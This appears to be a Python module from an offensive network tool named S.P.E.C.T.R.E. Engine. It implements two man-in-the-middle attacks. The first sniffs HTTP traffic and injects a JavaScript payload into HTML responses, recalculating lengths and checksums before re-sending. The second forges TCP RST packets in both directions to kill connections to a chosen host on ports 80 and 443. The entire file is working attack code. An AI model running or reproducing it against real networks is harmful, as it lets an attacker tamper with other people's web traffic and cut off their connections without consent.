# S.P.E.C.T.R.E. Engine - Licensed under AGPL-3.0
# Copyright (c) 2026 M. Sami Furqan. All rights reserved.
# See LICENSE file for full terms.

"""
core/mitm/injector.py — HTTP JS payload injector + TCP RST injection.
"""

from __future__ import annotations

import re
import socket
import time
from typing import TYPE_CHECKING

from core.mitm._scapy import Raw, TCP, IP, sniff, sendp, send, conf

if TYPE_CHECKING:
    from PySide6.QtCore import Signal


# ── HTTP Injector ──────────────────────────────────────────────────────────────

def _inject_http_payload(
    packet: object,
    passive_log_signal: Signal,  # type: ignore[type-arg]
) -> None:
    try:
        if (
            not packet.haslayer(Raw)  # type: ignore[union-attr]
            or not packet.haslayer(TCP)
            or not packet.haslayer(IP)
        ):
            return
        payload = packet[Raw].load  # type: ignore[index]
        if b"S.P.E.C.T.R.E." in payload:
            return
        if b"HTTP/1." in payload and b"text/html" in payload.lower():
            if b"\r\n\r\n" in payload:
                headers, body = payload.split(b"\r\n\r\n", 1)
                js_payload = b"<script>document.body.bgColor='#000';document.body.style.color='#0f0';alert('S.P.E.C.T.R.E.');</script>"
                if len(payload) + len(js_payload) > 1400:
                    return
                new_body = js_payload + body
                headers = re.sub(rb"(?i)Content-Length:\s*\d+\r\n", b"", headers)
                headers += f"Content-Length: {len(new_body)}\r\n".encode()
                packet[Raw].load = headers + b"\r\n\r\n" + new_body  # type: ignore[index]
                del packet[IP].len  # type: ignore[index]
                del packet[IP].chksum  # type: ignore[index]
                del packet[TCP].chksum  # type: ignore[index]
                sendp(packet, verbose=0)
                passive_log_signal.emit(
                    f"💉 Injected JS payload to {packet[IP].dst}", "DATA"  # type: ignore[index]
                )
    except Exception as e:
        passive_log_signal.emit(f" Injection Error: {str(e)}", "CRIT")


def run_http_injector(
    running_flag: list[bool],
    passive_log_signal: Signal,  # type: ignore[type-arg]
) -> None:
    """Intercept HTTP HTML responses and inject a JS payload."""
    passive_log_signal.emit("HTTP Injector Active. Modifying HTML payloads...", "INFO")
    while running_flag[0]:
        try:
            sniff(
                filter="tcp port 80",
                iface=conf.iface,
                prn=lambda pkt: _inject_http_payload(pkt, passive_log_signal),
                store=0,
                timeout=2,
            )
        except Exception:
            if running_flag[0]:
                time.sleep(0.5)


# ── TCP RST Injector ───────────────────────────────────────────────────────────

def _resolve_target(block_target: str, passive_log_signal: Signal) -> set[str] | None:  # type: ignore[type-arg]
    """Resolve block_target (IP or domain) to a set of IPs. Returns None on failure."""
    blocked_ips: set[str] = set()
    try:
        socket.inet_aton(block_target)
        blocked_ips.add(block_target)
        passive_log_signal.emit(f"🛑 Blocking IP: {block_target}", "WARN")
    except socket.error:
        try:
            resolved_ip = socket.gethostbyname(block_target)
            blocked_ips.add(resolved_ip)
            passive_log_signal.emit(f"🛑 Resolved {block_target} to {resolved_ip}", "WARN")
        except socket.gaierror:
            passive_log_signal.emit(
                f"❌ CRITICAL: Could not resolve domain {block_target}", "CRIT"
            )
            return None
    return blocked_ips


def _inject_rst_packet(
    packet: object,
    blocked_ips: set[str],
    block_target: str,
    passive_log_signal: Signal,  # type: ignore[type-arg]
) -> None:
    try:
        if not packet.haslayer(IP) or not packet.haslayer(TCP):  # type: ignore[union-attr]
            return
        src_ip = packet[IP].src  # type: ignore[index]
        dst_ip = packet[IP].dst  # type: ignore[index]
        sport = packet[TCP].sport  # type: ignore[index]
        dport = packet[TCP].dport  # type: ignore[index]
        seq = packet[TCP].seq  # type: ignore[index]
        ack = packet[TCP].ack  # type: ignore[index]

        is_blocked = dst_ip in blocked_ips or src_ip in blocked_ips
        if not is_blocked and block_target and packet.haslayer(Raw):
            payload_str = packet[Raw].load.decode("utf-8", errors="ignore").lower()  # type: ignore[index]
            if block_target in payload_str:
                is_blocked = True

        if is_blocked:
            payload_len = len(packet[Raw].load) if packet.haslayer(Raw) else 0  # type: ignore[index, union-attr]
            next_seq = seq + payload_len
            rst_same = IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=dport, flags="R", seq=next_seq)
            send(rst_same, verbose=0)
            rst_opp = IP(src=dst_ip, dst=src_ip) / TCP(sport=dport, dport=sport, flags="R", seq=ack)
            send(rst_opp, verbose=0)
            passive_log_signal.emit(
                f"🛑 TCP RST INJECTED: {src_ip}:{sport} <-> {dst_ip}:{dport} "
                f"(Killed connection to {block_target})",
                "CRIT",
            )
    except Exception:
        pass


def run_tcp_rst_injector(
    block_target: str,
    running_flag: list[bool],
    passive_log_signal: Signal,  # type: ignore[type-arg]
) -> None:
    """Forge TCP RST packets to kill connections to a specific host."""
    if not block_target:
        passive_log_signal.emit("❌ CRITICAL: No Block Target specified in UI!", "CRIT")
        return

    blocked_ips = _resolve_target(block_target, passive_log_signal)
    if blocked_ips is None:
        return

    passive_log_signal.emit("Listening on TCP Port 80 & 443...", "INFO")
    while running_flag[0]:
        try:
            sniff(
                filter="tcp port 80 or tcp port 443",
                iface=conf.iface,
                prn=lambda pkt: _inject_rst_packet(pkt, blocked_ips, block_target, passive_log_signal),
                store=0,
                timeout=2,
            )
        except Exception:
            if running_flag[0]:
                time.sleep(0.5)
